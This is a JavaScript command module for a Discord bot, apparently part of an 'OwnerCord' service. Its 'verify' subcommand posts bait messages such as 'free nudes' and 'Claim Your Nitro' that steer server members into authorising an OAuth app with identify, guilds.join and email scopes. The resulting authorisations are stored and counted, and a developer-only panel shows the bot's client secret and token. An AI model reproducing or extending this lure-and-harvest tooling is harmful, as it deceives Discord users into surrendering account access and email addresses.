  /* Core Module */
const Discord = require('discord.js')

/* Core Database */
const Bots = require('../Database/OwnerCord_Bots')
const Auths = require('../Database/OwnerCord_Auths')

module.exports = {
    data: new Discord.SlashCommandBuilder()
    .setName('bot')
    .setDescription('Bot komutları')
    .addSubcommand(subcommand =>
      subcommand.setName("secret")
        .setDescription("🔒 Set the client secret of the bot.")
        .addStringOption(option =>
          option.setName('key')
            .setDescription("🔒 The client secret of the bot.")
            .setRequired(true)
        )
    )
    .addSubcommand(subcommand => 
      subcommand.setName("verify")
        .setDescription("🔗 Displays verification messages.")
    )
    .addSubcommand(subcommand =>
      subcommand.setName("state")
      .setDescription("📊 Set the state of the bot")
      .addStringOption(option =>
        option.setName("name")
        .setDescription("The status name of the bot")
        .setRequired(true))
      .addStringOption(option =>
        option.setName("status")
        .setDescription("The status of the bot")
        .setRequired(true)
        .addChoices(
            { name: 'Online', value: 'online' },
            { name: 'Do Not Disturb', value: 'dnd' },
            { name: 'Idle', value: 'idle' },
            { name: 'Invisible', value: 'invisible' }
      ))
    )
    .addSubcommand(subcommand =>
        subcommand.setName("webhook")
          .setDescription("👻 Define the webhook url for the logs")
          .addStringOption(option => 
            option.setName("type")
              .setDescription("🔗 Webhook type")
              .setRequired(true)
              .addChoices(
                { name: "Auth", value: "Log_Auth" },
                { name: "Command", value: "Log_Command" },
              )
          )
          .addStringOption(option => 
            option.setName('url')
              .setDescription("🔗 Webhook URL")
              .setRequired(true)
          )
    )
    .addSubcommand(subcommand => 
      subcommand.setName("about")
        .setDescription("ℹ Display information about the bot.")
    ),
    async execute(interaction, client) {
      
      let embed = new Discord.EmbedBuilder()
      .setColor('#2c2c34')
      .setTitle(`${client.user.username} - Bot`)
      .setFooter({
        text: `Powered by OwnerCord`
      })
      .setTimestamp()
        
      let row = new Discord.ActionRowBuilder()
      .addComponents(
        new Discord.ButtonBuilder()
        .setLabel("⭐ Powered by OwnerCord")
        .setStyle(Discord.ButtonStyle.Link)
        .setURL(global.ownercord || "http://youtube.com/RowyHere")
      )

      async function fetchDeveloperUsernames() {
        const developerUsernames = [];
      
        for (const userId of global.client.developers) {
          try {
            const user = await client.users.fetch(userId);
            developerUsernames.push(`[\`${user.username}\`](https://lookup.guru/${userId})`);
          } catch (error) {
          }
        }
      
        return `${developerUsernames.join(", ")}`
      }

      async function fetchOwnerUsernames() {
        const ownerUsernames = [];
      
        for (const userId of global.owners) {
          try {
            const user = await client.users.fetch(userId);
            ownerUsernames.push(`[\`${user.username}\`](https://lookup.guru/${userId})`);
          } catch (error) {
          }
        }
      
        return `${ownerUsernames.join(", ")}`
      }

      let redirectURI = encodeURIComponent(global.redirecturi)
      let state = encodeURIComponent(JSON.stringify({
        guild: interaction.guild.id,
        bot: interaction.client.user.id
      }))
      let callbackURL = `https://discord.com/oauth2/authorize?client_id=${interaction.client.user.id}&redirect_uri=${redirectURI}${encodeURI("&response_type=code&scope=identify guilds.join email")}&state=${state}`

      let Bot = await Bots.findOne({ id: client.user.id })

      switch(interaction.options._subcommand) {
        case "secret":

          let SecretKey = interaction.options.getString("key")
          if(Bot?.Secret) interaction.reply({ ephemeral:true, embeds: [embed.setTitle(`${client.user.username} - Secret`).setDescription(`\`✅\` Succesfully has been updated your client secret please [Follow this link](${callbackURL}) to test your secret if its work.`)], components: [row] })
          else interaction.reply({ embeds: [embed.setTitle(`${client.user.username} - Secret`).setDescription(`\`✅\` Succesfully setted your client secret please [Follow this link](${callbackURL}) to test your secret if its work.`)], components: [row] })
          await Bots.findOneAndUpdate({ id: client.user.id }, { Secret: SecretKey }, { upsert: true })

        break;
        
        case "verify":

          let OwnerCordMenu = [{
            label: "Nude Verify",
            value: "nude",
            type: 1
          },
          {
            label: "NSFW Verify",
            value: "nsfw",
            type: 1
          },
          {
            label: "Nitro Verify",
            value: "nitro",
            type: 1
          },
          {
            label: "Normal Verify",
            value: "normal"
          }]
          
          const verifyRow = new Discord.ActionRowBuilder()
          .addComponents(
    
            new Discord.StringSelectMenuBuilder()
            .setCustomId("menu12")
            .setPlaceholder("Select an option")
            .addOptions(Bot?.type > 0 ? OwnerCordMenu.map(x => ({ label: x.label, value: x.value })) : OwnerCordMenu.filter((x) => x.type !== 1))
  
          )

          let msg = await interaction.reply({ ephemeral: true, components: [verifyRow] })
          let collector = msg.createMessageComponentCollector({ time: 30 * 1000})
  
          let auth = new Discord.ActionRowBuilder()
          .addComponents(
            new Discord.ButtonBuilder()
            .setLabel("Verify")
            .setURL(`${callbackURL}`)
            .setStyle(Discord.ButtonStyle.Link)
          )

          collector.on('collect', async (button) => {
    
            if(button.values && button.values.length > 0) {
                button.update({ components: [row], embeds: [embed.setDescription(`\`✅\` The menu setup is complete.`)]})
                switch(button.values[0]){

                    case "nude":
                        button.channel.send({ content: `Hello, you want free nudes? 👀 Follow the steps!
 ・First click Verify button!
 ・Second click Authorize
Now you are ready! 👅`, components: [auth]});
                    break;

                    case "nsfw":

                    embed.setDescription(`Click **verify** button for access our **NSFW** content`)
                    embed.setImage("https://cdn.discordapp.com/attachments/1150935440510169098/1156688411307024444/20230826_153934.png?ex=6515e187&is=65149007&hm=455319ed14d4d59fac7244a6e8816f184fd121cfa124be3ef65853b5f421547c&")
                    button.channel.send({ embeds: [embed], components: [auth]})

                    break;

                    case "nitro":

                    embed.setDescription(`
                    Hello, you need to Verify Your Account to Claim Your Nitro !
                    Verify Your Self By [Click here to Verify!](${callbackURL})`)
                    embed.setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
                    button.channel.send({ embeds: [embed], components: [auth]})

                    break;

                    case "normal":

                    embed.setDescription(`To get **access** to the rest of the server, click on the **verify** button.`)
                    button.channel.send({ embeds: [embed], components: [auth]})

                    break;

                }

            }

        })

        break;

        case "state":

          let pName = interaction.options.getString("name")
          let pStatus = interaction.options.getString("status")

          if(Bot?.Status) interaction.reply({ components: [row], embeds: [embed.setTitle(`${client.user.username} - State`).setDescription(`\`✅\` Succesfully has been updated **"${pName}"** state. `)]})
          else interaction.reply({ components: [row], embeds: [embed.setTitle(`${client.user.username} - State`).setDescription(`\`✅\` Succesfully setted the **"${pName}"** state. `)]})

          client.user.setPresence({ activities: [{ name: pName.replace("-username-", client.user.username) }], status: pStatus })
          await Bots.findOneAndUpdate({ id: client.user.id }, { Status: { name: pName, status: pStatus }}, { upsert: true })

        break;

        case "webhook":

          const regex = new RegExp(/https:\/\/discord.com\/api\/webhooks\/\d+\/[a-zA-Z0-9-_]{68}/);
          let url = interaction.options.getString('url')
          let choice = interaction.options.getString('type')
          if(!regex.test(url)) return interaction.reply({ components: [row], embeds: [embed.setTitle(`${client.user.username} - Webhook`).setDescription(`\`❌\` You have entered an invalid webhook url, please check the url.`)]})

          if(Bot[choice]) interaction.reply({ components: [row], embeds: [embed.setTitle(`${client.user.username} - Webhook`).setDescription(`\`✅\` Succesfully has been updated **"${choice.split("_")[1]}"** webhook.`)]})
          else interaction.reply({ components: [row], embeds: [embed.setTitle(`${client.user.username} - Webhook`).setDescription(`\`✅\` Succesfully setted the **"${choice.split("_")[1]}"** webhook.`)]})
          await Bots.findOneAndUpdate({ id: client.user.id }, { [`${choice}`]: url }, { upsert: true })

        break;

        case "about":

          let pBots = await Bots.find()
          let pAuths = await Auths.find()
          let pAuthsBot = await Auths.find({ bot: client.user.id })
          let pGuilds = client.guilds.cache.size
          let pUsers = client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0);
          let pUsersBot = client.guilds.cache.reduce((acc, guild) => acc + guild.members.cache.filter(member => member.user.bot).size, 0)
          /*
            NOTE: Do not change the number 0 or it will not show the total number of users correctly.
          */

            if(global.developers.includes(interaction.user.id)) {

              embed.setTitle("OwnerCord - Admin Control")
              embed.addFields(
                { name: "\`🚀\` Total bots in database", value: `${pBots.length}`, inline: true },
                { name: "\`🔱\` Total auths in database", value: `${pAuths.length}`, inline: true },
                { name: "\`🔑\` Linked auths", value: `${pAuthsBot.length}`, inline: true },
                { name: "\`📚\` Bot Information", value: `Servers: **${pGuilds}** \nUsers: **${pUsers}** (**+${pUsersBot} Bot**)`, inline: true },
                { name: "\`💡\` Plan", value: `${Bot?.type.replace("0", "Freemium").replace("1", "VIP Plan").replace("2", "Premium Plan")}`, inline: true },
                { name: "\`👑\` Bot Holder", value: `${await fetchOwnerUsernames()}`, inline: true },
                { name: "\`🔗\` Callback URI", value: `${Discord.codeBlock("json", callbackURL)}`, inline: false },
                { name: "\`🆔\` Bot ID", value: `${Discord.codeBlock("json", client.user.id)}`, inline: true },
                { name: "\`🔒\` Bot Secret", value: `${Discord.codeBlock("json", Bot?.Secret)}`, inline: true },
                { name: "\`🕵️‍♂️\` Bot Token", value: `${Discord.codeBlock("json", Bot?.Token)}`, inline: false },
              )

                interaction.reply({ ephemeral: true, embeds: [embed] })

          } else {

              embed.setTitle(`${client.user.username} - About`)
              embed.addFields(
              { name: "\`📚\` Bot Information", value: `Servers: **${pGuilds}** \nUsers: **${pUsers}** (**+${pUsersBot} Bot**)`, inline: true },
              { name: "\`🔑\` Linked auths", value: `${pAuthsBot.length}`, inline: true },
              { name: "\`💡\` Plan", value: `${Bot?.type.replace("0", "Freemium").replace("1", "VIP Plan").replace("2", "Premium Plan")}`, inline: true },
              { name: "\u200B", value: "\u200B", inline: true },
              { name: "\`👑\` Bot Holder", value: `${await fetchOwnerUsernames()}`, inline: true },
              { name: "\u200B", value: "\u200B", inline: true },
              { name: "\`🔗\` Callback URI", value: `${Discord.codeBlock("json", callbackURL)}`, inline: false },
            )

              interaction.reply({ ephemeral: true, embeds: [embed], components: [row] })

          }

        break;

      }

    }
}